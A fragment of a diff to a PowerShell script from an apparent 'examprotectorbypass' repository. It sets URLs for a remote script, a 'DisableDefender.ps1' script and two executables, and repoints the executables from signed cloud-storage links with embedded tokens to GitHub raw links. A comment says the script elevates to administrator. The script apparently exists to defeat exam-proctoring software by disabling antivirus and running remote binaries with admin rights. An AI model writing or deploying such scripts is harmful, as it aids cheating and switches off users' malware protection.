@@ -11,9 +11,9 @@
 $myUrl       = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/ets.ps1"
 $defenderUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/DisableDefender.ps1"
 
-$etsUrl = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/Ets_Gui.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL0V0c19HdWkuZXhlIiwic2NvcGUiOiJkb3dubG9hZCIsImlhdCI6MTc5MDM1NTkzNCwiZXhwIjoyMTA1NzE1OTM0fQ.-rbJr1uZjHx0V85zn3gKNI7V3k4JW6uX-_w2XUraNz0'
+$etsUrl = 'https://github.com/examprotectorbypass/jjs/raw/refs/heads/main/qzk/EtsGUI.exe'
 
-$dwUrl  = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/Dwluncher.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL0R3bHVuY2hlci5leGUiLCJzY29wZSI6ImRvd25sb2FkIiwiaWF0IjoxNzg5NjM2NzMwLCJleHAiOjI0MjAzNTY3MzB9.Ky8yFMWdmlANKKjKDk8EV2F82h__tlV7o5p2gwxRzzI'
+$dwUrl  = 'https://github.com/examprotectorbypass/jjs/raw/refs/heads/main/qzk/Dwluncher.exe'
 
 # ================================================================
 # 1) Elevate if we're not admin yet
